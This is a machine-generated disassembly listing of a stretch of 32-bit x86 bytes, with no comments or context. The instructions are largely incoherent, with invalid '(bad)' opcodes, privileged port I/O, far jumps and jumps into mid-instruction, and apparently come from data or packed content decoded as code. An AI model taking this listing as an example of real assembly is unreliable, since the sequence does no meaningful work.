  41f75a:	shl    BYTE PTR [eax+0x2e702d1b],cl
  41f760:	fs mov ebp,0x39835e26
  41f766:	clc    
  41f767:	in     eax,0xc3
  41f769:	xor    BYTE PTR ds:0x546faae1,dl
  41f76f:	xlat   BYTE PTR ds:[ebx]
  41f770:	jle    0x41f76e
  41f772:	repz (bad) 
  41f774:	out    0xa3,eax
  41f776:	jnp    0x41f706
  41f778:	test   BYTE PTR [ebp-0x15af24f0],ah
  41f77e:	add    BYTE PTR [ecx],dh
  41f780:	pushf  
  41f781:	jmp    0xe824:0x11cc2ceb
  41f788:	xchg   esp,eax
  41f789:	ror    DWORD PTR ds:0x4261752,0x3
  41f790:	and    ebx,eax
  41f792:	mov    ah,0xf3
  41f794:	outs   dx,DWORD PTR ds:[esi]
  41f795:	fst    QWORD PTR [edx-0x8]
  41f798:	lods   al,BYTE PTR ds:[esi]
  41f799:	cs jnp 0x41f7e2
  41f79c:	jl     0x41f757
  41f79e:	ja     0x41f753
  41f7a0:	mov    ebx,0x4931b6a2
  41f7a5:	fs je  0x41f72f
  41f7a8:	nop
  41f7a9:	xor    DWORD PTR [ebp+edx*1+0x1e],edi
  41f7ad:	fmul   st(1),st
  41f7af:	and    eax,0x3541b206
  41f7b4:	aaa    
  41f7b5:	(bad)  
  41f7b6:	mov    ds:0x7917dccd,al
  41f7bb:	pushf  
  41f7bc:	xchg   bh,bl
  41f7be:	mov    esp,DWORD PTR [edi+0x6]
  41f7c1:	add    eax,0x794d0b43
  41f7c6:	dec    esi
  41f7c7:	or     eax,0x8f9f1743
  41f7cc:	cwde   
  41f7cd:	mov    dl,0xe7
  41f7cf:	jnp    0x41f803
  41f7d1:	arpl   WORD PTR [ebx+ebx*8],dx
  41f7d4:	test   al,0xb9
  41f7d6:	fisubr DWORD PTR [esi]
  41f7d8:	scas   al,BYTE PTR es:[edi]
  41f7d9:	cmp    eax,DWORD PTR [ecx-0x5f]
  41f7dc:	push   ss
  41f7dd:	lods   eax,DWORD PTR ds:[esi]
  41f7de:	mov    esi,DWORD PTR [eax+0x59cd4fe2]
  41f7e4:	loop   0x41f7de
  41f7e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7e7:	or     eax,ebp
  41f7e9:	jge    0x41f7b7
  41f7eb:	sti    
  41f7ec:	lea    ebp,[esi-0x6e14c76c]
  41f7f2:	neg    BYTE PTR [ebx+0x78]
  41f7f5:	repnz pop esi
  41f7f7:	jbe    0x41f81a
  41f7f9:	mov    fs,WORD PTR [edx+0x549c72f6]
  41f7ff:	fidivr DWORD PTR [ebx-0x668b703e]
  41f805:	push   edi
  41f806:	push   esp
  41f807:	push   ebx
  41f808:	mov    ds:0x14b72fa,al
  41f80d:	in     al,dx
  41f80e:	mov    edx,0xef8336b3
  41f813:	shl    DWORD PTR [edi+eax*4-0x67f551c0],1
  41f81a:	xor    edi,DWORD PTR [esi+0x6851e26a]
  41f820:	imul   BYTE PTR [edx-0x41]
  41f823:	ins    BYTE PTR es:[edi],dx
  41f824:	or     edx,DWORD PTR es:[esi]
  41f827:	ss sbb dl,ah
  41f82a:	ds jle 0x41f825
  41f82d:	sar    BYTE PTR [eax+0x76a82752],1
  41f833:	ins    BYTE PTR es:[edi],dx
  41f834:	jno    0x41f85b
  41f836:	pop    edx
  41f837:	daa    
  41f838:	xor    DWORD PTR [ecx-0x63],eax
  41f83b:	aad    0x56
  41f83d:	jmp    0x2a30bb77
  41f842:	fisubr WORD PTR [ecx]
  41f844:	mov    bl,0x52
  41f846:	pushf  
  41f847:	lahf   
  41f848:	je     0x41f8c1
  41f84a:	js     0x41f889
  41f84c:	ss pop eax
  41f84e:	loop   0x41f7ed
  41f850:	iret   
  41f851:	pcmpgtw mm1,QWORD PTR [ebp-0x3cda406c]
  41f858:	adc    esi,esi
  41f85a:	dec    edx
  41f85b:	in     eax,dx
  41f85c:	sub    BYTE PTR [ecx+0x3f],0xbb
  41f860:	push   cs
  41f861:	mov    ah,0x46
  41f863:	xchg   ebp,eax
  41f864:	loopne 0x41f8c5
  41f866:	mov    ebx,DWORD PTR fs:[edx+0x25]
  41f86a:	or     al,0x16
  41f86c:	mov    ebx,0xaf01df64
  41f871:	pusha  
  41f872:	xor    al,0x6e
  41f874:	cmc    
  41f875:	adc    eax,eax
  41f877:	xlat   BYTE PTR ds:[ebx]
  41f878:	mov    BYTE PTR [edi+ecx*8+0x44],bl
  41f87c:	xor    DWORD PTR [eax],eax
  41f87e:	in     eax,0x2e
  41f880:	mov    ch,0x65
  41f882:	cmp    DWORD PTR [edi],edx
  41f884:	ins    BYTE PTR es:[edi],dx
  41f885:	loope  0x41f8b4
  41f887:	lods   al,BYTE PTR ds:[esi]
  41f888:	mov    bh,0x4d
  41f88a:	xchg   edi,eax
  41f88b:	push   eax
  41f88c:	das    
  41f88d:	pop    edi
  41f88e:	adc    dh,cl
  41f890:	xor    edi,esp
  41f892:	jno    0x41f8cb
  41f894:	mov    BYTE PTR [esi-0x3a],al
  41f897:	aas    
  41f898:	jnp    0x41f8be
  41f89a:	cmp    ebx,DWORD PTR [ebp-0xcde5554]
  41f8a0:	mov    esi,0x47f12a9a
  41f8a5:	inc    ebx
  41f8a6:	add    eax,ecx
  41f8a8:	jl     0x41f8c2
  41f8aa:	fadd   DWORD PTR [eax]
  41f8ac:	xchg   esi,eax
  41f8ad:	inc    eax
  41f8ae:	dec    esp
  41f8af:	iret   
  41f8b0:	gs dec ebx
  41f8b2:	shl    DWORD PTR [ebx-0x7b],0xeb
  41f8b6:	jo     0x41f88f
  41f8b8:	jecxz  0x41f8a5
  41f8ba:	hlt    
  41f8bb:	or     eax,0x36808b7d
  41f8c0:	push   ebp
  41f8c1:	xchg   edi,eax
  41f8c2:	cmp    eax,DWORD PTR [edi]
  41f8c4:	sub    BYTE PTR [ecx+esi*2-0x2d719533],cl
  41f8cb:	cmp    edi,DWORD PTR [ebx]
  41f8cd:	std    
  41f8ce:	inc    edi
  41f8cf:	dec    esi
  41f8d0:	mov    cl,0x74
  41f8d2:	jno    0x41f883
  41f8d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8d5:	pop    ss
  41f8d6:	dec    ebp
  41f8d7:	mov    ds:0xd744fad7,eax
  41f8dc:	mov    WORD PTR [ebp+0x33],es
  41f8df:	sub    bl,ah
  41f8e1:	(bad)  [ebp+0x6c]
  41f8e4:	cli    
  41f8e5:	sub    esi,DWORD PTR [bp-0x1e]
  41f8e9:	fwait
  41f8ea:	ins    DWORD PTR es:[edi],dx
  41f8eb:	outs   dx,BYTE PTR ds:[esi]
  41f8ec:	add    DWORD PTR [edx-0x764b7ec6],ebx
  41f8f2:	add    ah,BYTE PTR [esi+0x15f1980c]
  41f8f8:	pop    ds
  41f8f9:	push   ecx
  41f8fa:	fwait
  41f8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8fc:	sbb    al,0x49
  41f8fe:	xor    bl,cl
  41f900:	dec    esp
  41f901:	mov    ds:0x9906a894,al
  41f906:	sbb    BYTE PTR [ebp+0x41],bh
  41f909:	sbb    eax,ebp
  41f90b:	add    esp,0x367d59fa
  41f911:	mov    ds:0x7f783b65,eax
  41f916:	jae    0x41f904
  41f918:	cdq    
  41f919:	jno    0x41f8f9
  41f91b:	pop    ds
  41f91c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41f91e:	repz out 0xf8,eax
  41f921:	or     bh,BYTE PTR [edi+0x37]
  41f924:	add    ebx,ebp
  41f926:	mov    al,0xc6
  41f928:	retf   0x7d46
  41f92b:	retf   
  41f92c:	jo     0x41f994
  41f92e:	jecxz  0x41f8fb
  41f930:	add    eax,0xe9c97ff2
  41f935:	add    BYTE PTR [esi],0x29
  41f938:	fst    QWORD PTR [ebx+0x16febdf4]
  41f93e:	call   0xc3c7:0x6d35163d
  41f945:	lock mov ch,0x86
  41f948:	sub    ch,BYTE PTR [ecx]
  41f94a:	xchg   DWORD PTR [ebx-0x63],ecx
  41f94d:	or     BYTE PTR [edx-0x151fd3b6],ah
  41f953:	test   al,0x2c
  41f955:	jbe    0x41f8d9
  41f957:	mov    dl,0x88
  41f959:	and    dh,BYTE PTR [ebx-0x1333090f]
  41f95f:	call   0xac9fd4dd
  41f964:	mov    esp,0x72547528
  41f969:	pop    esp
  41f96a:	call   0xa380:0xc357f37a
  41f971:	adc    ebx,DWORD PTR [ebx+0x473288e6]
  41f977:	aas    
  41f978:	test   BYTE PTR [edi-0x22bbaa91],dl
  41f97e:	mov    edx,0xc932958b
  41f983:	retf   0x19de
  41f986:	pop    ebx
  41f987:	inc    esp
  41f988:	ja     0x41f93e
  41f98a:	or     eax,0x4e125dc4
  41f98f:	sbb    eax,0xf176b800
  41f994:	jne    0x41f927
  41f996:	cmp    al,0xe4
  41f998:	in     eax,0xf1
  41f99a:	je     0x41f946
  41f99c:	jl     0x41f95f
  41f99e:	pusha  
  41f99f:	outs   dx,DWORD PTR ds:[esi]
  41f9a0:	jmp    0x41f937
  41f9a2:	mov    ch,BYTE PTR [eax+0x76b660a9]
  41f9a8:	cld    
  41f9a9:	mov    esi,ebp
  41f9ab:	sbb    ebx,DWORD PTR [ecx+0x62]
  41f9ae:	xchg   ecx,eax
  41f9af:	mov    bh,0x9b
  41f9b1:	inc    esp
  41f9b2:	iret   
  41f9b3:	jmp    0x9e29cbbf
  41f9b8:	jb     0x41fa32
  41f9ba:	sub    BYTE PTR ds:0xaa167485,cl
  41f9c0:	ins    BYTE PTR es:[edi],dx
  41f9c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9c2:	cmp    al,0xc4
  41f9c4:	fld    DWORD PTR [esi+0x44]
  41f9c7:	int    0xab
  41f9c9:	and    ecx,eax
  41f9cb:	fcom   DWORD PTR [ebp-0x1a]
  41f9ce:	ret    
  41f9cf:	add    eax,0xaea30e1c
  41f9d4:	or     al,0xdf
  41f9d6:	(bad)  
  41f9d7:	out    dx,al
  41f9d8:	shl    DWORD PTR [ebx],0x40
  41f9db:	mov    WORD PTR [edx-0x4df14a38],es
  41f9e1:	jbe    0x41f967
  41f9e3:	pop    ebx
  41f9e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9e5:	cmp    dl,BYTE PTR [edi-0x55515dae]
  41f9eb:	jo     0x41fa0f
  41f9ed:	jle    0x41f99a
  41f9ef:	cmp    DWORD PTR [ebp+0x17125ab0],ecx
  41f9f5:	ret    
  41f9f6:	add    DWORD PTR [edx+0x3c],edi
  41f9f9:	add    dh,BYTE PTR [esi+ebp*1-0x482a2f0e]
  41fa00:	sbb    eax,0xbda10917
  41fa05:	fcmovnbe st,st(2)
  41fa07:	mul    ah
  41fa09:	hlt    
  41fa0a:	jmp    0x41f9bb
  41fa0c:	ret    
  41fa0d:	fild   QWORD PTR [eax-0x46]
  41fa10:	(bad)
  41fa15:	xor    eax,0x6175e6b9
  41fa1a:	(bad)  
  41fa1b:	bnd jmp 0x41fa24
  41fa1e:	out    0x5c,al
  41fa20:	ja     0x41fa05
  41fa22:	enter  0xfbe2,0xd4
  41fa26:	xchg   DWORD PTR [eax-0x77bab842],eax
  41fa2c:	adc    ch,dl
  41fa2e:	jmp    0x41faae
  41fa30:	and    al,0xd8
  41fa32:	fs cmp bl,dl
  41fa35:	fadd   DWORD PTR [ecx+edi*8]
  41fa38:	shl    BYTE PTR [ecx+0x72e55b88],cl
  41fa3e:	dec    esi
  41fa3f:	ins    DWORD PTR es:[edi],dx
  41fa40:	sbb    ebx,DWORD PTR [edi+ebp*1+0x69]
  41fa44:	outs   dx,BYTE PTR ds:[esi]
  41fa45:	xchg   ebp,eax
  41fa46:	je     0x41fa74
  41fa48:	mov    ebp,0xb90ec0ae
  41fa4d:	sub    BYTE PTR [ebp-0x288a2d2f],bl
  41fa53:	aas    
  41fa54:	pop    eax
  41fa55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa56:	mov    ecx,0x22ec58d3
  41fa5b:	out    dx,al
  41fa5c:	jge    0x41fa93
  41fa5e:	cmp    al,dl
  41fa60:	and    ch,BYTE PTR [eax+0x6161b4c4]
  41fa66:	hlt    
  41fa67:	add    bl,cl
  41fa69:	lahf   
  41fa6a:	ss cdq 
  41fa6c:	fstp   st(5)
  41fa6e:	ins    BYTE PTR es:[edi],dx
  41fa6f:	push   edx
  41fa70:	mov    bl,0xd4
  41fa72:	mov    eax,ds:0x88a7f7b1
  41fa77:	mov    esi,0x5c082b6c
  41fa7c:	loope  0x41fac0
  41fa7e:	ret    0x4a27
  41fa81:	add    bh,BYTE PTR [ebx]
  41fa83:	pop    esi
  41fa84:	std    
  41fa85:	push   0x1a
  41fa87:	mov    ebx,0x41129675
  41fa8c:	xchg   esi,eax
  41fa8d:	rol    BYTE PTR [esi+0x67427cc6],1
  41fa93:	cmp    eax,0x9a5f0205
  41fa98:	fistp  WORD PTR [esi]
  41fa9a:	inc    edx
  41fa9b:	jg     0x41fa49
  41fa9d:	pop    esi
  41fa9e:	sub    DWORD PTR [ebx+0x5ccfcca4],ecx
  41faa4:	(bad)  
  41faa5:	mov    ebx,0x8a0c8cb8
  41faaa:	cli    
  41faab:	mov    al,0x4b
  41faad:	loop   0x41fb02
  41faaf:	imul   ecx,esp,0xffffffe0
  41fab2:	adc    eax,0x58ab16bf
  41fab7:	aam    0xf2
  41fab9:	shl    DWORD PTR [edx-0x5a],cl
  41fabc:	loopne 0x41fa8d
  41fabe:	push   edi
  41fabf:	add    BYTE PTR [eax],al
  41fac1:	pop    edx
  41fac2:	push   es
  41fac3:	out    dx,eax
  41fac4:	sbb    al,0x33
  41fac6:	xor    eax,0xe728b3e6
  41facb:	mov    ebp,0xc7de269d
  41fad0:	xchg   edx,eax
  41fad1:	jmp    0xe839:0xd76d7849
  41fad8:	retf   
  41fad9:	mov    esi,0x26c52a98
  41fade:	out    0xb8,al
  41fae0:	xchg   esp,eax
  41fae1:	jae    0x41fae3
  41fae3:	add    BYTE PTR [eax],al
  41fae5:	add    BYTE PTR [eax],al
  41fae7:	add    BYTE PTR [eax],al
  41fae9:	add    BYTE PTR [eax+0x4a],bl
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	xor    DWORD PTR [eax-0x75af66d4],0x6800001
  41fb00:	add    BYTE PTR [eax],al
  41fb02:	iret   
  41fb03:	sbb    eax,0x2cdb84ff
  41fb08:	jae    0x41fb06
  41fb0a:	aad    0xf5
  41fb0c:	xor    ebx,DWORD PTR [edx+0x10fee5f0]
  41fb12:	and    al,0xa8
  41fb14:	or     al,0xda
  41fb16:	call   0x5d44:0x2fc1be17
  41fb1d:	sbb    al,0x3d
  41fb1f:	lods   eax,DWORD PTR ds:[esi]
  41fb20:	dec    ecx
  41fb21:	and    al,0xb4
  41fb23:	sbb    al,0x99
  41fb25:	popf   
  41fb26:	sbb    eax,0x4c35348f
  41fb2b:	xlat   BYTE PTR ds:[ebx]
  41fb2c:	xchg   dl,cl
  41fb2e:	cmp    ah,BYTE PTR [eax]
  41fb30:	and    ecx,0x2f
  41fb33:	repnz fnstenv [eax-0x27338061]
  41fb3a:	mov    ebx,0x8ab4d748
  41fb3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb41:	pusha  
  41fb42:	dec    esi
  41fb43:	aad    0x5a
  41fb45:	push   es
  41fb46:	fst    QWORD PTR [ebx-0x2a]
  41fb49:	adc    DWORD PTR [edx+0x28],ecx
  41fb4c:	sub    eax,0xbb925225
  41fb51:	jne    0x41faf2
  41fb53:	adc    al,bh
  41fb55:	cmp    al,0x50
  41fb57:	or     ebp,ebx
  41fb59:	pop    es
  41fb5a:	and    eax,0x9dc4a581
  41fb5f:	ins    BYTE PTR es:[edi],dx
  41fb60:	mov    ecx,0xe91c8f6
  41fb65:	xlat   BYTE PTR ds:[ebx]
  41fb66:	xchg   DWORD PTR [edi],edx
  41fb68:	cwde   
  41fb69:	sahf   
  41fb6a:	das    
  41fb6b:	inc    eax
  41fb6c:	or     DWORD PTR ds:0xa0c98113,ebp
  41fb72:	fsubr  QWORD PTR [ecx+0x6298aabc]
  41fb78:	pop    esi
  41fb79:	dec    ebx
  41fb7a:	sahf   
  41fb7b:	pushf  
  41fb7c:	lahf   
  41fb7d:	xchg   edx,eax
  41fb7e:	jb     0x41fbaf
  41fb80:	and    dl,bl
  41fb82:	nop
  41fb83:	mov    WORD PTR [ecx+0x62e481ae],fs
  41fb89:	jge    0x41fb4e
  41fb8b:	mov    dh,0x32
  41fb8d:	int3   
  41fb8e:	and    ah,BYTE PTR [eax+ebp*1-0x10c2e657]
  41fb95:	and    eax,0x5b27864a
  41fb9a:	cld    
  41fb9b:	push   ebp
  41fb9c:	out    0xdb,al
  41fb9e:	cmp    esp,DWORD PTR [eax]
  41fba0:	js     0x41fbbb
  41fba2:	loop   0x41fbb7
  41fba4:	(bad)  [ecx]
  41fba6:	mov    ah,0x64
  41fba8:	lods   eax,DWORD PTR ds:[esi]
  41fba9:	inc    esi
  41fbaa:	dec    esi
  41fbab:	and    bl,bl
  41fbad:	pop    esi
  41fbae:	and    ebp,DWORD PTR [edi-0x1b]
  41fbb1:	add    esi,0xffffff9b
  41fbb4:	push   ebx
  41fbb5:	into   
  41fbb6:	mov    bh,0xe6
  41fbb8:	ss inc esp
  41fbba:	rcr    eax,1
  41fbbc:	lods   eax,DWORD PTR ds:[esi]
  41fbbd:	iret   
  41fbbe:	rcl    DWORD PTR [ebp+0x1d],cl
  41fbc1:	mov    ecx,0x7a6cb090
  41fbc6:	(bad)
  41fbc9:	push   eax
  41fbca:	call   0xc54c9902
  41fbcf:	jge    0x41fc38
  41fbd1:	adc    eax,0x658bbf5f
  41fbd6:	or     DWORD PTR [edx],edx
  41fbd8:	sti    
  41fbd9:	rol    al,0xea
  41fbdc:	popa   
  41fbdd:	shl    DWORD PTR [edx-0xfea3958],1
  41fbe3:	add    al,0x4a
  41fbe5:	and    ecx,DWORD PTR [edi+0x37]
  41fbe8:	xor    DWORD PTR [edi],eax
  41fbea:	mov    dl,0x43
  41fbec:	mov    esi,0xd84b61e9
  41fbf1:	add    ecx,DWORD PTR [ecx+0x189bd55c]
  41fbf7:	jmp    0x41fc2d
  41fbf9:	mov    esi,0x588fa06e
  41fbfe:	pop    ss
  41fbff:	adc    al,BYTE PTR [ecx+0x60]
  41fc02:	dec    DWORD PTR [edi]
  41fc04:	repz mov WORD PTR [edi],es
  41fc07:	mov    ch,0x41
  41fc09:	arpl   bp,dx
  41fc0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc0c:	test   BYTE PTR [ebp-0x18],0x1d
  41fc10:	mov    al,ds:0x18414984
  41fc15:	fisub  WORD PTR [edi]
  41fc17:	push   ecx
  41fc18:	fdivr  QWORD PTR [ecx+0x4e82d738]
  41fc1e:	cmova  ebp,DWORD PTR [edi+0x56ecd4ba]
  41fc25:	hlt    
  41fc26:	add    eax,0x7e7619de
  41fc2b:	aam    0xab
  41fc2d:	cmp    al,0x1a
  41fc2f:	retf   0x3fcd
  41fc32:	push   ss
  41fc33:	jecxz  0x41fbe6
  41fc35:	das    
  41fc36:	jmp    0x300:0xc587daf1
  41fc3d:	jmp    0x41fbf0
  41fc3f:	inc    eax
  41fc40:	js     0x41fbd8
  41fc42:	ret    
  41fc43:	daa    
  41fc44:	test   DWORD PTR [edx-0x24],ebp
  41fc47:	aaa    
  41fc48:	mov    ecx,0x6dced768
  41fc4d:	cwde   
  41fc4e:	pop    ss
  41fc4f:	and    DWORD PTR [ecx-0x5bda8c85],eax
  41fc55:	hlt    
  41fc56:	out    dx,eax
  41fc57:	or     eax,0xa1a5fa8b
  41fc5c:	fild   DWORD PTR [esi+0x39]
  41fc5f:	adc    al,0xfa
  41fc61:	cwde   
  41fc62:	cs pop ebx
  41fc64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc65:	sbb    BYTE PTR [edx-0x34],bh
  41fc68:	inc    ecx
  41fc69:	jo     0x41fcbe
  41fc6b:	and    BYTE PTR [ecx+0x46],bh
  41fc6e:	mov    edx,0x5bd5e279
  41fc73:	mov    dl,0x4e
  41fc75:	lock fistp DWORD PTR [ebp-0x46]
  41fc79:	xchg   DWORD PTR [ecx+edi*1+0x15],edx
  41fc7d:	jno    0x41fca1
  41fc7f:	clc    
  41fc80:	xchg   edx,eax
  41fc81:	int3   
  41fc82:	daa    
  41fc83:	mov    ch,0x5
  41fc85:	hlt    
  41fc86:	mov    ebp,0x9ac04285
  41fc8b:	sub    BYTE PTR [edx],al
  41fc8d:	xor    cl,bl
  41fc8f:	jno    0x41fcb9
  41fc91:	xchg   BYTE PTR [edi+0xa],bh
  41fc94:	and    al,0xee
  41fc96:	inc    edx
  41fc97:	or     al,0x53
  41fc99:	push   esi
  41fc9a:	sub    al,0x1f
  41fc9c:	aaa    
  41fc9d:	sbb    BYTE PTR [edi+0x737ae353],bh
  41fca3:	test   al,0x30
  41fca5:	jmp    DWORD PTR [edx+0x5f10171f]
  41fcab:	pop    esi
  41fcac:	mov    ebx,0x59c5cbbf
  41fcb1:	ins    BYTE PTR es:[edi],dx
  41fcb2:	or     dh,BYTE PTR [edi]
  41fcb4:	and    DWORD PTR [edx-0x366c919],0xffffffc0
  41fcbb:	sub    dh,bh
  41fcbd:	aas    
  41fcbe:	popa   
  41fcbf:	ret    0x2815
  41fcc2:	adc    BYTE PTR [edi+0x7eaa1a77],cl
  41fcc8:	fmul   DWORD PTR [esi]
  41fcca:	adc    DWORD PTR [ecx+0x4f],ebp
  41fccd:	xchg   edx,eax
  41fcce:	mov    ds:0xcc72367b,eax
  41fcd3:	cld    
  41fcd4:	add    ecx,DWORD PTR [ebp+0x5304487b]
  41fcda:	and    ebx,DWORD PTR gs:[esi+0x22dc8b43]
  41fce1:	adc    al,0x14
  41fce3:	inc    ebx
  41fce4:	fimul  DWORD PTR [edx+0x3ec69c84]
  41fcea:	xchg   edx,eax
  41fceb:	ds xchg ebp,eax
  41fced:	inc    edi
  41fcee:	fucomip st,st(7)
  41fcf0:	cs inc edi
  41fcf2:	push   edi
  41fcf3:	call   0x86a5:0xfbfc535
  41fcfa:	loop   0x41fd46
  41fcfc:	lods   eax,DWORD PTR ds:[esi]
  41fcfd:	(bad)  
  41fcfe:	fstp   TBYTE PTR [esi-0x9]
  41fd01:	out    0xc2,al
  41fd03:	xor    eax,0x105702e1
  41fd08:	sub    BYTE PTR [edx],0x88
  41fd0b:	int    0x14
  41fd0d:	(bad)
  41fd10:	pop    ds
  41fd11:	ins    BYTE PTR es:[edi],dx
  41fd12:	jecxz  0x41fd0a
  41fd14:	mov    dl,0x13
  41fd16:	ins    DWORD PTR es:[edi],dx
  41fd17:	inc    eax
  41fd18:	outs   dx,BYTE PTR ds:[esi]
  41fd19:	jmp    0xdfd5d06e
  41fd1e:	mov    dl,0x8b
  41fd20:	push   esp
  41fd21:	push   ecx
  41fd22:	adc    DWORD PTR [ecx],ebp
  41fd24:	jp     0x41fcfc
  41fd26:	inc    esi
  41fd27:	ins    DWORD PTR es:[edi],dx
  41fd28:	shr    ah,0x39
  41fd2b:	bound  eax,QWORD PTR [esi+eiz*4]
  41fd2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd30:	cmp    edi,DWORD PTR ds:0x7b5ab453
  41fd36:	(bad)  
  41fd37:	retf   0x98c0
  41fd3a:	retf   
  41fd3b:	ds and eax,0x62e47c06
  41fd41:	call   0x9a78b3ff
  41fd46:	and    DWORD PTR [ebp-0x377fc415],esp
  41fd4c:	fdivr  QWORD PTR [esi-0x5c]
  41fd4f:	adc    esi,DWORD PTR [ebp-0x54]
  41fd52:	adc    eax,0x14cf3199
  41fd57:	rcl    DWORD PTR [edx-0x1ebf2ed0],0xf9
  41fd5e:	push   ebx
  41fd5f:	jo     0x41fde0
  41fd61:	fnstsw WORD PTR [ebx+0x9e95b0b]
  41fd67:	and    ebp,esi
  41fd69:	cmp    eax,0x116ed616
  41fd6e:	pop    ebx
  41fd6f:	mov    ah,BYTE PTR [ebp+0x61314d41]
  41fd75:	fisub  WORD PTR [esi-0x4b9d8365]
  41fd7b:	imul   edi,DWORD PTR [eax+0x9d5d055],0x31
  41fd82:	scas   eax,DWORD PTR es:[edi]
  41fd83:	loop   0x41fd35
  41fd85:	adc    DWORD PTR [edi+0x17a6d859],esp
  41fd8b:	dec    eax
  41fd8c:	mov    esp,0x1de828ec
  41fd91:	adc    eax,0x70bd124c
  41fd96:	sub    BYTE PTR [edi+edx*2-0x1828c8a3],0x5e
  41fd9e:	scas   eax,DWORD PTR es:[edi]
  41fd9f:	mov    dl,0x32
  41fda1:	xor    esp,DWORD PTR [eax+eax*8+0x570832d4]
  41fda8:	push   edx
  41fda9:	stos   BYTE PTR es:[edi],al
  41fdaa:	adc    esi,DWORD PTR [ebx+0x9]
  41fdad:	adc    eax,0x3457d597
  41fdb2:	cmp    bl,BYTE PTR [ebx-0x42ae848d]
  41fdb8:	addr16 push cs
  41fdba:	xor    ebp,DWORD PTR [edx]
  41fdbc:	push   cs
  41fdbd:	out    dx,al
  41fdbe:	and    al,0x56
  41fdc0:	cmp    ah,BYTE PTR [ecx+edx*4+0x5e84f72f]
  41fdc7:	jmp    0xdf286292
  41fdcc:	das    
  41fdcd:	and    bh,BYTE PTR [esp+ebx*1]
  41fdd0:	and    ch,BYTE PTR [eax]
  41fdd2:	mov    bh,0xc3
  41fdd4:	mov    ebp,0x4b67c677
  41fdd9:	and    BYTE PTR [esi+0x15b6cf78],bh
  41fddf:	aaa    
  41fde0:	mov    bl,0x67
  41fde2:	fs push ebp
  41fde4:	lea    eax,[edx]
  41fde6:	retf   
  41fde7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fde8:	mov    ch,0x69
  41fdea:	popf   
  41fdeb:	xchg   BYTE PTR [edx+ebp*1-0x5f],ch
  41fdef:	add    al,0xdb
  41fdf1:	(bad)  
  41fdf2:	jg     0x41fe03
  41fdf4:	leave  
  41fdf5:	not    DWORD PTR [ecx-0x23]
  41fdf8:	add    DWORD PTR [edx-0xe],ebp
  41fdfb:	fiadd  DWORD PTR [eax]
  41fdfd:	dec    ebp
  41fdfe:	xor    dh,ah
  41fe00:	adc    DWORD PTR [ebp+0x3b6deaa],edi
  41fe06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe07:	pusha  
  41fe08:	push   ebp
  41fe09:	mov    al,0x44
  41fe0b:	adc    ebp,ecx
  41fe0d:	in     al,dx
  41fe0e:	push   esi
  41fe0f:	or     esp,DWORD PTR [edx-0x55]
  41fe12:	stos   DWORD PTR es:[edi],eax
  41fe13:	jmp    0x39b8:0x94d7cb3f
  41fe1a:	jb     0x41fe11
  41fe1c:	add    al,0x34
  41fe1e:	dec    eax
  41fe1f:	mov    ah,0x65
  41fe21:	mov    eax,0x3266beed
  41fe26:	xchg   esi,eax
  41fe27:	xor    DWORD PTR [edx+eiz*2+0x182a6eb3],esp
  41fe2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe2f:	in     al,0xaf
  41fe31:	imul   ebx,DWORD PTR [ebx-0x7c],0x2c58062d
  41fe38:	aaa    
  41fe39:	push   ecx
  41fe3a:	push   ebp
  41fe3b:	stos   BYTE PTR es:[edi],al
  41fe3c:	pusha  
  41fe3d:	int3   
  41fe3e:	or     BYTE PTR [esi],0x49
  41fe41:	dec    ebp
  41fe42:	call   0x3941:0x59cc5516
  41fe49:	dec    edi
  41fe4a:	inc    esp
  41fe4b:	(bad)  
  41fe4c:	jp     0x41fec3
  41fe4e:	dec    eax
  41fe4f:	xchg   ebp,eax
  41fe50:	pop    es
  41fe51:	cmp    al,dl
  41fe53:	sahf   
  41fe54:	dec    edi
  41fe55:	stc    
  41fe56:	loop   0x41fed3
  41fe58:	repz test BYTE PTR [ebp+0x5b],al
  41fe5c:	in     al,0xda
  41fe5e:	adc    bh,bl
  41fe60:	jbe    0x41fe38
  41fe62:	addr16 xchg esi,eax
  41fe64:	mov    ebx,0x8e81c839
  41fe69:	mov    al,ds:0xd36380e2
  41fe6e:	mov    eax,0xb90d88b9
  41fe73:	mov    BYTE PTR ds:0x8637146f,ah
  41fe79:	inc    ebx
  41fe7a:	mov    WORD PTR [ecx],ds
  41fe7c:	mov    ds:0x1ad9ff32,al
  41fe81:	or     al,0xe0
  41fe83:	xchg   ebx,eax
  41fe84:	adc    DWORD PTR ds:0xff054213,edi
  41fe8a:	cmp    ebx,DWORD PTR [edx-0x26782165]
  41fe90:	in     al,dx
  41fe91:	retf   0xf799
  41fe94:	inc    edx
  41fe95:	sar    BYTE PTR [ecx-0x77],cl
  41fe98:	mov    ss,WORD PTR [ebp-0x2141806c]
  41fe9e:	jmp    0xb976:0x6310625d
  41fea5:	fs mov ah,0x3c
  41fea8:	pop    es
  41fea9:	and    BYTE PTR [ebx],0xd2
  41feac:	pop    ds
  41fead:	call   0x298f2cde
  41feb2:	mov    DWORD PTR [ecx+eiz*2],ecx
  41feb5:	call   0x9ce8:0x792ad068
  41febc:	xchg   esp,eax
  41febd:	mov    ebp,0x961fd449
  41fec2:	xchg   edx,eax
  41fec3:	mov    ecx,DWORD PTR [ebx+0x79]
  41fec6:	sub    al,0xd
  41fec8:	fsubr  st(1),st
  41feca:	punpckhdq mm4,mm2
  41fecd:	retf   
